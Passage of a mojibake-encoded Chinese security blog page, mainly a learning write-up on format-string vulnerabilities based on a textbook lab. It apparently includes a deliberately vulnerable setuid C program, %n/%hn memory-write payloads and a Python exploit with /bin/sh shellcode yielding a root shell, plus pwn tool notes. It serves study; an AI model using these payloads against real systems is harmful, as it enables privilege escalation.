libcåœ°å€è®¡ç®—ç±»æ ¼å¼åŒ–å­—ç¬¦ä¸²shellcodeShellcraft.sh()
patchelfpatchelf â€“set-interpreter &#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu11.3_i386&#x2F;ld-linux.so.2 .&#x2F;a.outpatchelf â€“set-rpath &#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu11.3_i386&#x2F; .&#x2F;a.out		
gadgetç›¸å…³å·¥å…·ROPgadgetROPgadget â€“binary rop  â€“only â€˜pop|retâ€™ | grep â€˜eaxâ€™   
ROPgadget â€“binary ret2syscall  â€“only â€˜intâ€™
ROPgadget â€“binary ret2syscall  â€“string â€˜&#x2F;bin&#x2F;shâ€™
objdump


libcsearchhttps://blog.csdn.net/qq_44108455/article/details/105458234
https://blog.csdn.net/csdn546229768/article/details/121177641
apt get install zstd
åœ¨çº¿æœç´¢libc libc database searchhttps://libc.blukat.me
https://libc.rip
https://github.com/niklasb/libc-database
https://github.com/lieanu/LibcSearcher
Linuxè‡ªå¸¦å·¥å…·fileâ€‹		æŸ¥çœ‹æ–‡ä»¶åŸºæœ¬ä¿¡æ¯

lddæ‰“å°ä¾èµ–çš„å…±äº«åº“æ–‡ä»¶

nmæ‰“å°å¯æ‰§è¡Œç¨‹åºçš„ç¬¦å·ä¿¡æ¯

stringsæŸ¥çœ‹å¯æ‰“å°å­—ç¬¦ä¸²ä¿¡æ¯

objdumpæ‰“å°å¯æ‰§è¡Œç¨‹åºçš„ä¿¡æ¯
-h æ‰“å°sectionå¤´ä¿¡æ¯

-d æ‰“å°å¯æ‰§è¡Œsectionæ±‡ç¼–

readelfæŸ¥çœ‹dataæ®µ
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-5-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" title="pwnå…¥é—¨-5-æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´">pwnå…¥é—¨-5-æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2023-01-22T04:51:43.000Z" title="å‘è¡¨äº 2023-01-22 12:51:43">2023-01-22</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2023-11-08T10:38:14.406Z" title="æ›´æ–°äº 2023-11-08 18:38:14">2023-11-08</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWNå…¥é—¨</a></span></div><div class="content">å¤‡å¿˜1.çœ‹ä¸€ä¸‹å…¶ä»–èµ„æ–™ã€ä¹¦ã€åšå®¢ã€dataconçš„è§†é¢‘ç­‰
2.åˆ·é¢˜
ä¸»è¦æ˜¯å¯¹ã€Šè®¡ç®—æœºå®‰å…¨å¯¼è®º-æ·±åº¦å®è·µã€‹ é‡Œé¢æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸€ç« èŠ‚çš„å­¦ä¹ å’Œå¤ç°
åŸºç¡€printfç­‰è¾“å‡ºå‡½æ•°ä¸ºä»€ä¹ˆå¯ä»¥æ¥æ”¶ä»»æ„æ•°é‡çš„å‚æ•°?  å°±æ˜¯è¿™ä¹ˆè®¾è®¡çš„

va_listæ˜¯ä»€ä¹ˆ? å¦‚ä½•ç§»åŠ¨?
å‚è§ã€Šè®¡ç®—æœºå®‰å…¨å¯¼è®º æ·±åº¦å®è·µã€‹107é¡µ
æ¼æ´ç¨‹åºä¸åˆ©ç”¨æ¼æ´ç¨‹åº
12345678910111213141516171819#include &lt;stdio.h&gt;void fmtstr()&#123;	char input[100];	int var = 0x11223344;  //è¾“å‡ºä¸€äº›åé¢è¦ç”¨åˆ°çš„æ•°æ®	printf(&quot;target address %x\n&quot;,(unsigned) &amp;var);	printf(&quot;data at target address:0x%x\n&quot;,var);	printf(&quot;please enter a string:&quot;);	fgets(input, sizeof(input)-1,stdin);	printf(input); //æ¼æ´ç‚¹åœ¨è¿™é‡Œ	printf(&quot;data at target address: 0x%x\n&quot;,var);&#125;void main()&#123;	fmtstr();&#125;



gcc -m32 -o vul vul.c ç¼–è¯‘32ä½çš„
å»é™¤ä¿æŠ¤éœ€è¦å—?  -fno-stack-protector                gcc -m32  -fno-stack-protector -o vul vul.c  
sudo chown root vul
sudo chmod 4755 vul
sudo sysctl -w kernel.randomize_va_space&#x3D;0 å…³é—­åœ°å€éšæœºåŒ–ä¿æŠ¤
è®¤è¯†ç¨‹åºæ ˆäº†è§£ç¨‹åºåœ¨æ ˆä¸­çš„å¸ƒå±€éå¸¸é‡è¦

è¾“å‡ºæ ˆä¸­çš„æ•°æ®%x.%x.%x.%x.%x.%x.%x.%x.%x.
63.f7fbd5c0.565555d9.ffffd5aa.11223344.252e7825.78252e78.2e78252e.252e7825.
ä¸ºä»€ä¹ˆæ˜¯%xå‘¢? åˆ«çš„å‘¢? çœ‹åŸºç¡€é‡Œé¢çš„å›¾,è¿™ä¸ªæ˜¯printfçš„è¾“å‡ºæ ¼å¼ ,
è¿™ä¸ªé¡ºåºæ˜¯ä»€ä¹ˆé¡ºåºå‘¢?ä»å“ªé‡Œå¼€å§‹å‘¢? ä¸ºä»€ä¹ˆä¸æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ°å€æŒ¨ç€å˜é‡å‘¢?
åˆšè¾“å…¥è¿›å»çš„æ—¶å€™æ˜¯æŒ¨ç€çš„å‘€,å“¦å¼,è¿™æ˜¯ä»espä¸‹é¢ç¬¬ä¸€ä¸ªå¼€å§‹å¾€ä¸‹æ‰“å°,æ‰€ä»¥è¿™é‡Œçš„æ ˆæ¡¢ç»“æ„å’Œä¸Šé¢çš„å›¾æ˜¯åç€çš„!!
1234567891000:0000â”‚ esp 0xffffd510 â€”â–¸ 0xffffd52c â—‚â€” &#x27;%x.%x.%x.%x.%x.%x.%x.%x.%x.\n&#x27;01:0004â”‚     0xffffd514 â—‚â€” 0x63 /* &#x27;c&#x27; */02:0008â”‚     0xffffd518 â€”â–¸ 0xf7fbd5c0 (_IO_2_1_stdin_) â—‚â€” 0xfbad228803:000câ”‚     0xffffd51c â€”â–¸ 0x56555579 (fmtstr+12) â—‚â€” add    ebx, 0x1a5704:0010â”‚     0xffffd520 â€”â–¸ 0xffffd55a â—‚â€” 0xf400010005:0014â”‚     0xffffd524 â€”â–¸ 0xf7ffc984 (_rtld_global_ro+132) â—‚â€” 0x606:0018â”‚     0xffffd528 â—‚â€” 0x1122334407:001câ”‚     0xffffd52c â—‚â€” &#x27;%x.%x.%x.%x.%x.%x.%x.%x.%x.\n&#x27;pwndbg&gt;08:0020â”‚  0xffffd530 â—‚â€” &#x27;x.%x.%x.%x.%x.%x.%x.%x.\n



åœ¨gdbä¸­,ç›´æ¥r,ç„¶åè¾“å…¥%x.%x.%x.%x.%x.%x.%x.%x.%x., å°±ç›´æ¥è¿è¡Œç»“æŸäº†,æ²¡åŠæ³•çœ‹åˆ°è°ƒè¯•åçš„æ•ˆæœ,è¿™ä¹Ÿæ˜¯è‡ªå·±åˆšå¼€å§‹å¾ˆä¹…éƒ½ä¸ä¼šçš„è°ƒè¯•æ–¹æ³•â€¦è¿™ç§é—®é¢˜åº”è¯¥å’ŒåŒå­¦äº¤æµçš„,æœç´¢å¼•æ“ä¹Ÿä¸å®¹æ˜“æœåˆ°.
pwndbg&gt; rStarting program: &#x2F;home&#x2F;ubuntu&#x2F;cssec&#x2F;strings&#x2F;vultarget address ffffd524data at target address:0x11223344please enter a string:%x.%x.%x.%x.%x.%x.%x.%x.%x.63.f7fbd5c0.565555d9.ffffd55a.11223344.252e7825.78252e78.2e78252e.252e7825.data at target address: 0x11223344[Inferior 1 (process 28953) exited normally
åœ¨å®ƒä¹‹åä¸‹æ–­ç‚¹å°±å¯ä»¥äº†å§ 
12345678910111213141516171819202122232425262728293031323334   0x5655563d &lt;fmtstr+112&gt;    lea    eax, [ebp - 0x70]   0x56555640 &lt;fmtstr+115&gt;    push   eax â–º 0x56555641 &lt;fmtstr+116&gt;    call   fgets@plt                    &lt;fgets@plt&gt;        s: 0xffffd528 â€”â–¸ 0xf7ffc988 (_rtld_global_ro+136) â—‚â€” 0x55 /* &#x27;U&#x27; */        n: 0x63        stream: 0xf7fbd5c0 (_IO_2_1_stdin_) â—‚â€” 0xfbad2088   0x56555646 &lt;fmtstr+121&gt;    add    esp, 0x10   0x56555649 &lt;fmtstr+124&gt;    sub    esp, 0xc   0x5655564c &lt;fmtstr+127&gt;    lea    eax, [ebp - 0x7                                                                                      å¯ä»¥åœ¨è¿™åé¢ç›´æ¥ä¸‹æ–­ç‚¹å³å¯ b *0x56555646                                                  åœ¨fgetsè¾“å…¥åå¾—åˆ°æ ˆçš„å¸ƒå±€å¦‚ä¸‹                                     pwndbg&gt; teles00:0000â”‚ esp     0xffffd510 â€”â–¸ 0xffffd528 â—‚â€” &#x27;aaaabbbbccccddddeeeeffff\n&#x27;01:0004â”‚         0xffffd514 â—‚â€” 0x63 /* &#x27;c&#x27; */02:0008â”‚         0xffffd518 â€”â–¸ 0xf7fbd5c0 (_IO_2_1_stdin_) â—‚â€” 0xfbad228803:000câ”‚         0xffffd51c â€”â–¸ 0x565555d9 (fmtstr+12) â—‚â€” add    ebx, 0x19f304:0010â”‚         0xffffd520 â€”â–¸ 0xffffd55a â—‚â€” 0x9d00010005:0014â”‚         0xffffd524 â—‚â€” 0x1122334406:0018â”‚ eax ecx 0xffffd528 â—‚â€” &#x27;aaaabbbbccccddddeeeeffff\n&#x27;07:001câ”‚         0xffffd52c â—‚â€” &#x27;bbbbccccddddeeeeffff\n&#x27;pwndbg&gt;08:0020â”‚  0xffffd530 â—‚â€” &#x27;ccccddddeeeeffff\n&#x27;09:0024â”‚  0xffffd534 â—‚â€” &#x27;ddddeeeeffff\n&#x27;0a:0028â”‚  0xffffd538 â—‚â€” &#x27;eeeeffff\n&#x27;0b:002câ”‚  0xffffd53c â—‚â€” &#x27;ffff\n&#x27;0c:0030â”‚  0xffffd540 â—‚â€” 0xa /* &#x27;\n&#x27; */0d:0034â”‚  0xffffd544 â—‚â€” 0x2c307d /* &#x27;&#125;0,&#x27; */0e:0038â”‚  0xffffd548 â—‚â€” 0x1                                        



æˆ–è€…ç›´æ¥siè¿›å»æŸ¥çœ‹å°±å¥½äº†,å…³é”®æ˜¯æ€ä¹ˆåœ¨pwntoolsä¸­è¿›è¡Œå…³è”
è¿™ä¸ªé¡ºåºæ˜¯ä»€ä¹ˆé¡ºåºå‘¢?ä»å“ªé‡Œå¼€å§‹å‘¢?12345678910111213141516pwndbg&gt; ni63.f7fbd5c0.565555d9.ffffd55a.11223344.252e7825.78252e78.2e78252e.252e7825.0x56555655 in fmtstr ()    00:0000â”‚ esp 0xffffd510 â€”â–¸ 0xffffd528 â—‚â€” &#x27;%x.%x.%x.%x.%x.%x.%x.%x.%x.\n&#x27;01:0004â”‚     0xffffd514 â—‚â€” 0x63 /* &#x27;c&#x27; */02:0008â”‚     0xffffd518 â€”â–¸ 0xf7fbd5c0 (_IO_2_1_stdin_) â—‚â€” 0xfbad228803:000câ”‚     0xffffd51c â€”â–¸ 0x565555d9 (fmtstr+12) â—‚â€” add    ebx, 0x19f304:0010â”‚     0xffffd520 â€”â–¸ 0xffffd55a â—‚â€” 0x6000010005:0014â”‚     0xffffd524 â—‚â€” 0x1122334406:0018â”‚     0xffffd528 â—‚â€” &#x27;%x.%x.%x.%x.%x.%x.%x.%x.%x.\n&#x27;07:001câ”‚     0xffffd52c â—‚â€” &#x27;x.%x.%x.%x.%x.%x.%x.%x.\n  èƒ½çœ‹åˆ°é€šè¿‡%xè¾“å‡ºçš„æ˜¯ä»espçš„ä¸‹ä¸€ä¸ªå¼€å§‹,å¾€ebpæ–¹å‘è¾“å‡º  252e7825 åº”è¯¥æ˜¯%x.çš„asciiä¹‹ç±»çš„?????????????/



ä¿®æ”¹å†…å­˜ä¸­çš„æ•°æ®â€‹		ä¸€å¼€å§‹ä¼šè§‰å¾—å¾ˆå¥‡æ€ª,printfä¸æ˜¯è¾“å‡ºä¸œè¥¿çš„å—, ä¸ºä»€ä¹ˆå¯ä»¥ä¿®æ”¹æ•°æ®,è¿™å°±æ¶‰åŠåˆ°ä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„ç”¨æ³•äº†,printfä¸­æœ‰ä¸€ä¸ª%n,ä¼šæŠŠç›®å‰å·²æ‰“å°å‡ºçš„å­—ç¬¦çš„ä¸ªæ•°å†™å…¥å†…å­˜,æ•°æ®åœ¨å†…å­˜ä¸­ä¿å­˜çš„æœ¬è´¨å°±æ˜¯æ•°å­—,æ‰€ä»¥è¿™æ ·å°±å¯ä»¥ä¿®æ”¹äº†
â€‹		
123target address ffffe43cdata at target address:0x11223344Segmentation fault (core dumped)

â€‹		ä¸ºä»€ä¹ˆä¼šä¸€ç›´æŠ¥è¿™ä¸ªé”™å‘¢???
â€‹	64ä½å’Œ32ä½å¯ä»¥åˆ†åˆ«è°ƒè¯•ä¸€ä¸‹
x&#x2F;wx 0xffffe3ec0xffffe3ec:	Cannot access memory at address 0xffffe3ec  
???
123â–º 0x565555ff &lt;fmtstr+50&gt;    call   printf@plt                    &lt;printf@plt&gt;       format: 0x56555760 â—‚â€” &#x27;target address %x\n&#x27;       vararg: 0xffffd524 â—‚â€” 0x11223344



pwndbg&gt; x&#x2F;wx 0xffffd5240xffffd524:	0x11223344
32ä½å¯ä»¥è®¿é—®äº†â€¦
64ä½çš„ä¸ºä»€ä¹ˆä¼šå´©æºƒå‘¢? å†™å…¥æ•°æ®çš„æ—¶å€™ Segmentation fault (core dumped)
å› ä¸ºä¸èƒ½è®¿é—®è¿™ä¸ªåœ°å€,ä¸ºä»€ä¹ˆä¸èƒ½è®¿é—®å‘¢? æ„Ÿè§‰è¿™ä¸ªåœ°å€æœ‰é—®é¢˜,æœç„¶,æ˜¯å‰é¢å°‘äº†ä¸œè¥¿! ä¸ºå•¥å°‘å‘¢? å’Œæºä»£ç é‡Œé¢çš„%xæœ‰å…³ç³»å—,gdbä¹Ÿæ²¡æç¤ºè¿™ä¸ªå‘€â€¦.
123456pwndbg&gt; x/2wx 0x7fffffffe3e80x7fffffffe3e8:	0xf7ffe710	0x11223344pwndbg&gt; x/2wx 0xffffe3ec0xffffe3ec:	Cannot access memory at address 0xffffe3ecpwndbg&gt; x/2wx 0x7fffffffe3ec0x7fffffffe3ec:	0x11223344	0x00000000







å…ˆç”¨è¯•é”™æ³•,ä¸åŠ %næ‰¾åˆ°è¦ä¿®æ”¹çš„åœ°å€çš„ä½ç½®è·ç¦»va_listæŒ‡é’ˆæœ‰å‡ ä¸ªç§»åŠ¨ä½ç½®(æ¯ä¸€ä¸ª%xä¼šè¾“å‡ºä¸€ä¸ªä¸œè¥¿,ç„¶åva_listæŒ‡é’ˆç§»åŠ¨,æˆ‘ä»¬éœ€è¦æŠŠå®ƒç§»åŠ¨åˆ°å­˜å‚¨è¦ä¿®æ”¹çš„å†…å®¹çš„åœ°å€çš„åœ°æ–¹)
123456root@VM-24-10-ubuntu:/home/ubuntu/cssec/strings# echo $(printf &quot;\x64\xd4\xff\xff&quot;).%x.%x.%x.%x.%x.%x &gt; inputroot@VM-24-10-ubuntu:/home/ubuntu/cssec/strings# ./vul32 &lt; inputtarget address ffffd464data at target address:0x11223344please enter a string:d.63.f7fbd5c0.565555d9.ffffd49a.11223344.ffffd464data at target address: 0x11223344

éœ€è¦ç§»åŠ¨äº”ä¸ªä½ç½®æ‰èƒ½åˆ°ffffd464,5ä¸ª%x,ç„¶å%næŠŠå‰é¢çš„æ•°æ®å†™å…¥åˆ°è¿™ä¸ªåœ°å€
123456root@VM-24-10-ubuntu:/home/ubuntu/cssec/strings# echo $(printf &quot;\x74\xd5\xff\xff&quot;).%x.%x.%x.%x.%x.%n &gt; inputroot@VM-24-10-ubuntu:/home/ubuntu/cssec/strings# ./vul32 &lt; inputtarget address ffffd574data at target address:0x11223344please enter a string:tï¿½ï¿½ï¿½.63.f7fbd5c0.565555d9.ffffd5aa.11223344.data at target address: 0x2c

0x2c ä¹Ÿå°±æ˜¯ 32 + 12 &#x3D; 44
44æ€ä¹ˆæ¥çš„å‘¢,é‡åˆ°%nä¹‹å‰è¾“å‡ºäº†44ä¸ªå­—ç¬¦,5 * 8 &#x3D; 40,è¿™æ˜¯ç¬¬ 1 3456ä¸ªè¾“å‡º, ç¬¬äºŒä¸ªè¾“å‡ºæ˜¯63 ä¹Ÿå°±æ˜¯ä¸¤ä½,
4 + 2 + 4*8 + 6 &#x3D; 44
4(\x64\xd4\xff\xff) + 2(63) + 4 *8  + 6(ç‚¹) &#x3D; 44 ,å°±æ˜¯è¿™ä¸€ä¸²:tï¿½ï¿½ï¿½.63.f7fbd5c0.565555d9.ffffd5aa.11223344.
ä¿®æ”¹å†…å­˜ä¸­æ•°æ®ä¸ºæŒ‡å®šå€¼ä¿®é¥°ç¬¦â€‹		è¿™é‡Œæ¶‰åŠåˆ°æŒ‡å®šå€¼çš„å¤§å°é—®é¢˜,å¦‚æœå¾ˆå¤§çš„å€¼è‚¯å®šä¸èƒ½ä¸€ç›´å †å­—ç¬¦,ç”¨ç²¾åº¦æˆ–è€…å®½åº¦ä¿®é¥°ç¬¦æ¥è§£å†³
â€‹		echo $(printf â€œ\x64\xd4\xff\xffâ€).%.8x.%x.%x.%x.%.10000000x.%n &gt; input
123456root@VM-24-10-ubuntu:/home/ubuntu/cssec/strings# echo $(printf &quot;\x64\xd4\xff\xff&quot;).%.8x.%x.%x.%x.%x.%n &gt; inputroot@VM-24-10-ubuntu:/home/ubuntu/cssec/strings# ./vul32 &lt; inputtarget address ffffd464data at target address:0x11223344please enter a string:d.00000063.f7fbd5c0.565555d9.ffffd49a.11223344.data at target address: 0x32

ç²¾åº¦ä¿®é¥°ç¬¦:
å®½åº¦ä¿®é¥°ç¬¦:
ä½†æ˜¯è¿™æ ·åšä¹Ÿæœ‰é—®é¢˜,éœ€è¦æ‰“å°å¾ˆå¤šå­—ç¬¦,è€—æ—¶è€—èµ„æº&gt;
æ›´å¿«çš„åŠæ³•â€‹		æ ¼å¼è§„å®šç¬¦çš„é•¿åº¦ä¿®é¥°ç¬¦
â€‹		%n:è§†å‚æ•°ä¸º4å­—èŠ‚æ•´å‹æ•°
â€‹		%hn:è§†å‚æ•°ä¸º2å­—èŠ‚çŸ­æ•´å‹æ•°
â€‹		%hhn:è§†å‚æ•°ä¸º1å­—èŠ‚å­—ç¬¦å‹æ•°
1234pwndbg&gt; x/2bx 0xffffd4160xffffd416:     0x22    0x11pwndbg&gt; x/2bx 0xffffd4140xffffd414:     0x44    0x33

echo $(printf â€œ\x66\xd4\xff\xff@@@@\x64\xd4\xff\xffâ€)%.8x%.8x%.8x%.8x%.26204x%hn%.4369x%hn &gt; input
data at target address: 0x6688779
åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³¨å…¥æ¶æ„ä»£ç æ¼æ´æºä»£ç 
1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;void fmtstr(char *str)&#123;	unsigned int *framep;	unsigned int *ret;	asm(&quot;movl %%ebp,%0&quot; : &quot;=r&quot; (framep));	ret = framep +1;	printf(&quot;the address of the input array: 0x%.8x\n&quot;,(unsigned)str);	printf(&quot;the value of the frame pointer: 0x%.8x\n&quot;,(unsigned)framep);	printf(&quot;the value of the return address: 0x%.8x\n&quot;,*ret);	printf(str);	printf(&quot;the value of the return address: 0x%.8x\n&quot;,*ret);&#125;int main(int argc,char **argv)&#123;	FILE *badfile;	char str[200];	badfile = fopen(&quot;badfile&quot;,&quot;rb&quot;);	fread(str,sizeof(char),200,badfile);	fmtstr(str);	return 1;&#125;





ç¼–è¯‘:gcc -m32 -z execstack -o fmtvul fmtvul.c
echo $(printf â€œ\xaa\xaa\xaa\xaaâ€).%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x &gt; badfile
å’Œä¹¦ä¸Šçš„ä¸å¤ªä¸€æ ·,è¿™é‡Œæ˜¯ç¬¬22ä¸ª,ä¸å¯¹,æ˜¯ç¬¬21ä¸ª,ç¬¬ä¸€ä¸ªæ˜¯â€\xaa\xaa\xaa\xaaâ€è¿™ä¸ª,ä¸ç®—,æ‰€ä»¥%.8xæ˜¯è¾“å‡ºäº†20ä¸ªååˆ°äº†aaaaaaaa.
123456root@VM-24-10-ubuntu:/home/ubuntu/cssec/strings/shell# ./fmtvulthe address of the input array: 0xffffd514the value of the frame pointer: 0xffffd4e8the value of the return address: 0x565556fdï¿½ï¿½ï¿½ï¿½.565556fd.00000000.565555f9.5655583c.56555839.ffffd4e8.ffffd4ec.f7fbd000.56556fcc.ffffd5e8.565556fd.ffffd514.00000001.000000c8.56558160.f7ffdc30.00000200.00000400.ffffd694.56558160.aaaaaaaa.382e252e.2e252e78.252e7838.2e78382e.78382e25.382e252e.2e252e78.252e7838.2e78382eï¿½the value of the return address: 0x565556fd



è¿”å›åœ°å€ 0xffffd4e8 + 0x4 &#x3D; 0xffffd4ec
å®éªŒä¸­è·³è½¬åˆ°stræ•°ç»„åç§»é‡0x90çš„åœ°æ–¹, 0xffffd514 +0x90 &#x3D; 0xffffd5a4
exp
123456789101112131415161718192021222324252627282930import sysshellcode = (        &quot;\x31\xc0\x31\xdb\xb0\xd5\xcd\x80&quot;        &quot;\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50&quot;        &quot;\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x00&quot;        ).encode(&#x27;latin-1&#x27;)N = 200content = bytearray(0x90 for i in range(N))start = N - len(shellcode)content[start:] = shellcodeaddr2 = 0xffffd3deaddr1 = 0xffffd3dccontent[0:4] = (addr1).to_bytes(4,byteorder=&#x27;little&#x27;)content[4:8] = (&quot;@@@@&quot;).encode(&#x27;latin-1&#x27;)content[8:12] = (addr2).to_bytes(4,byteorder=&#x27;little&#x27;)small = 0xd484 - 12 -15*8large = 0xffff - 0xd484s = &quot;%.8x&quot;*15 + &quot;%.&quot; + str(small) + &quot;x%hn%.&quot; + str(large) +&quot;x%hn&quot;fmt = (s).encode(&#x27;latin-1&#x27;)content[12:12+len(fmt)] = fmtfile=open(&quot;badfile&quot;,&quot;wb&quot;)file.write(content)file.close()







12                                               Ì€the value of the return address: 0xffffd4ecSegmentation fault (core dumped)

åœ°å€ä¿®æ”¹å¯¹äº†,ä½†è¿˜æ˜¯æŠ¥é”™äº†,å’Œlibcç‰ˆæœ¬æœ‰å…³ç³»?è¿˜æ˜¯éœ€è¦å»é™¤ä¿æŠ¤?-fno-stack-protector
the address of the input array: 0xffffd514the value of the frame pointer: 0xffffd4f8
123456root@VM-24-10-ubuntu:/home/ubuntu/cssec/strings/shell# ./fmtvulthe address of the input array: 0xffffd544the value of the frame pointer: 0xffffd528the value of the return address: 0x56555691ï¿½ï¿½ï¿½ï¿½.56555691.00000000.565555a9.565557ac.565557a9.ffffd52c.ffffd528.f7fbd000.56556fd0.ffffd618.56555691.ffffd544.00000001.000000c8.56558160.00000000.aaaaaaaa.382e252e.2e252e78.252e7838.2e78382e.78382e25.382e252e.2e252e78.252e7838.2e78382e.78382e25.382e252e.2e252e78.252e7838ï¿½the value of the return address: 0x56555691



é—®é¢˜å‡ºåœ¨äº†è¿™é‡Œ,åœ¨æˆ‘ä»¬è¿™é‡Œç¼–è¯‘çš„æ—¶å€™,æ˜¯ç¬¬17ä¸ªä½ç½®å­˜å‚¨ç€stræ•°ç»„,å’Œä¹¦ä¸Šä¸ä¸€æ ·,è¿™å¯èƒ½å’Œç¼–è¯‘å™¨ç‰ˆæœ¬ç­‰æœ‰å…³,æ‰€ä»¥è¿˜æ˜¯è¦å…·ä½“é—®é¢˜å…·ä½“åˆ†æ,çœ‹æ‡‚äº†ä¹¦é‡Œçš„,ç„¶ååœ¨å®é™…æ“ä½œä¸­æ ¹æ®å®é™…æƒ…å†µåŠ¨æ€ä¿®æ”¹ä¸€äº›ä¸œè¥¿æ‰å¯ä»¥
ä»rootç”¨æˆ·åˆ‡æ¢åˆ°ubuntuä¹Ÿä¼šæ”¹å˜ä¸€äº›ä¸œè¥¿,åœ°å€ä¹Ÿå˜äº†
the address of the input array: 0xffffd3f4                0xffffd3f4 + 0x90 &#x3D; 0xffffd484the value of the frame pointer: 0xffffd3d8the value of the return address: 0x5655569
ä¿®æ”¹expé‡Œé¢å¯¹åº”çš„åœ°å€å’Œ%xçš„ä¸ªæ•°,ç„¶åå°±å¯ä»¥äº†
123400000000000000000000000000000000000040404040ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½1ï¿½1Û°ï¿½Ì€1ï¿½Ph//shh/binï¿½ï¿½PSï¿½á™°                                                               Ì€the value of the return address: 0xffffd484# iduid=0(root) gid=500(ubuntu) groups=500(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),114(sambashare)







%n$x è¡¨ç¤ºæ ¼å¼å­—ç¬¦ä¸²åçš„ç¬¬nä¸ªæ•°æ®
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/" title="ucas-ç½‘ç»œä¸ç³»ç»Ÿå®‰å…¨-å¤ä¹ ">ucas-ç½‘ç»œä¸ç³»ç»Ÿå®‰å…¨-å¤ä¹ </a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2022-12-30T11:18:28.000Z" title="å‘è¡¨äº 2022-12-30 19:18:28">2022-12-30</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2023-06-18T03:20:58.680Z" title="æ›´æ–°äº 2023-06-18 11:20:58">2023-06-18</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E7%A0%94%E7%A9%B6%E7%94%9F%E8%AF%BE%E7%A8%8B/">ç ”ç©¶ç”Ÿè¯¾ç¨‹</a></span></div><div class="content">å¤šé€‰å•é€‰è®ºè¿°
å…¶ä¸­æœ‰å¤§éƒ¨åˆ†æ˜¯å…¶ä»–åŒå­¦å®Œæˆçš„,è‡ªå·±åšäº†ä¸€å®šçš„æ•´åˆå’Œä¿®æ”¹.
ç¬¬ä¸€æ¬¡è¯¾ï¼šæ–°å½¢åŠ¿å®‰å…¨é¢ä¸´æŒ‘æˆ˜å’Œå®‰å…¨ä¿éšœèƒ½åŠ›æå‡1.1 ä¿¡æ¯æŠ€æœ¯çš„å‘å±•è¶‹åŠ¿å¯¹è±¡çš„ç‰¹ç‚¹: èåˆã€æ‰©å¼ ã€åä½œï¼›
1.2 ä¿¡æ¯å®‰å…¨é¢ä¸´çš„æŒ‘æˆ˜éšç§ã€èº«ä»½ã€ç”µå­ä¾èµ–ã€ä¿¡ä»»ç»‘æ¶ã€ä¿¡æ¯è´¢å¯Œã€è¾¹ç•Œæ¨¡ç³Š
1.3 ä¿¡æ¯å®‰å…¨çš„æŠ€æœ¯å‘å±•è¶‹åŠ¿ä¿æŠ¤ã€æ£€æµ‹ã€å¯ç”Ÿå­˜ã€å¯ä¿¡èµ–ï¼›
æ£€æµ‹åˆå«å…¨å‘¨æœŸâ€¦
ç¬¬äºŒæ¬¡è¯¾ï¼šç½‘ç»œä¸ç³»ç»Ÿå®‰å…¨çš„éœ€æ±‚ä¸ç›®æ ‡â€‹		å³æˆ‘ä»¬è¦åšåˆ°ä»€ä¹ˆç¨‹åº¦,ä¸Šä¸€èŠ‚è¯¾æ˜¯è¦åšä»€ä¹ˆ
2.1 ä¿¡æ¯å®‰å…¨çš„åŸºæœ¬éœ€æ±‚ï¼šCIAAæœºå¯†æ€§Confidentialityï¼›å®Œæ•´æ€§Integrityï¼›å¯ç”¨æ€§Availabilityï¼›çœŸå®æ€§Authenticityï¼›
